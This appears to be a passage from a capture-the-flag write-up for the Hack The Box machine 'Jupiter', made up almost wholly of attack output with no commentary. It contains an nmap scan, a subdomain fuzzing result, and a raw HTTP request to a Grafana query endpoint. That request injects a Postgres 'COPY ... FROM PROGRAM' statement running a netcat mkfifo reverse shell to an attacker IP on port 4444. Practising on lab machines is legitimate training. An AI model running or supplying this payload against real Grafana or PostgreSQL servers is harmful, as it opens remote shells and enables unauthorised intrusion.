
| PORT | STATE | SERVICE | VERSION                                   |
|------|-------|---------|-------------------------------------------|
| 22/tcp | open  | ssh     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.1           |
|      |       |         |   (Ubuntu Linux; protocol 2.0)             |
|      |       |         |   SSH Hostkey:                             |
|      |       |         |     - ECDSA: 256 ac:5b:be:79:2d:c9:7a:00:ed:9a:e6:2b:2d:0e:9b:32 |
|      |       |         |     - ED25519: 256 60:01:d7:db:92:7b:13:f0:ba:20:c6:c9:00:a7:1b:41 |
| 80/tcp | open  | http    | nginx 1.18.0 (Ubuntu)                      |
|      |       |         |   HTTP Server Header: nginx/1.18.0 (Ubuntu) |
|      |       |         |   http-title: Did not follow redirect to http://jupiter.htb/ |
|      |       |         |                                           |
| Service Info:                             |                                           |
| OS   | CPE                     |                                           |
| Linux | cpe:/o:linux:linux_kernel |                                           |


# FUZZER

|   | Method | URL | Wordlist | Header | Follow Redirects | Calibration | Timeout | Threads | Matcher | Filter |
|---|--------|-----|----------|--------|------------------|-------------|---------|---------|---------|--------|
| **Info** | GET | http://jupiter.htb | FUZZ: /home/aexon/tools/wordlist/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt | Host: FUZZ.jupiter.htb | false | false | 10 | 40 | Response status: 200-299,301,302,307,401,403,405,500 | Response size: 178 |
| **Results** | kiosk | [Status: 200, Size: 34390, Words: 2150, Lines: 212, Duration: 87ms] | | | | | | | | |



```json
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
Content-Length: 608
x-plugin-id: postgres
x-grafana-org-id: 1
x-panel-id: 24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
content-type: application/json
accept: application/json, text/plain, */*
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
Origin: http://kiosk.jupiter.htb
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 4444 >/tmp/f';",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 940
    }
  ],
  "range": {
    "from": "2024-06-27T03:13:21.951Z",
    "to": "2024-06-27T09:13:21.951Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1719458001951",
  "to": "1719479601951"
}

```

